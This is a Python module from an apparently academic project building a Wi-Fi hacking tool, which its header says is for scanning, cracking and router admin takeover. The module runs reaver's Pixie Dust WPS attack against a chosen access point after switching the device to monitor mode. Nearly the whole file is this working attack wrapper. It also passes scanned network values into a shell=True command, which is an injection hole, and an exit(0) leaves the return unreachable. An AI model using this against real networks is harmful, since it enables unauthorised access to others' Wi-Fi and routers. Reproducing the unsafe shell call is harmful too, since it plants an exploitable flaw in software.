'''
==============================
NSSECU2 - Hacking Tool Project
==============================
Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
Topic: WiFi Hacking Tool
Description: The objective of this project is to create a packaged tool that will be able to do Wi-Fi scanning, cracking, and admin control access.
Objective Functionalities:
    1. WiFi Scanning & Handshake Capture
    2. WiFi Cracking
    3. WAP/Router Admin Control Access

WPS CRACKING MODULE
'''

import subprocess
import utils.utils as utils
import interfaces.interfaces as interface

def crack(wifi:dict, device):
    pin = ""
    desc = ["Target: " + wifi["essid"] + " (" + wifi["bssid"] + ")"]
    
    if not utils.yesNo("WPS Scan + Cracking", desc, "Begin WPS Cracking?", False):
        return ""
    
    interface.enable_monitor(device, channel=wifi["channel"])
    
    reaver_command = "reaver -i " + interface.get_logicalname(device) + " -c " + wifi["channel"] + " -b " + wifi["bssid"] + " -K -vv"
    reaver_process = subprocess.Popen(reaver_command, shell=True)

    utils.header("WPS Cracking",["Cracking in progress...","Command: " + reaver_command])
    res, err = reaver_process.communicate()
    print(res)

    utils.getch()
    interface.disable_monitor(device)
    exit(0)
    
    return pin
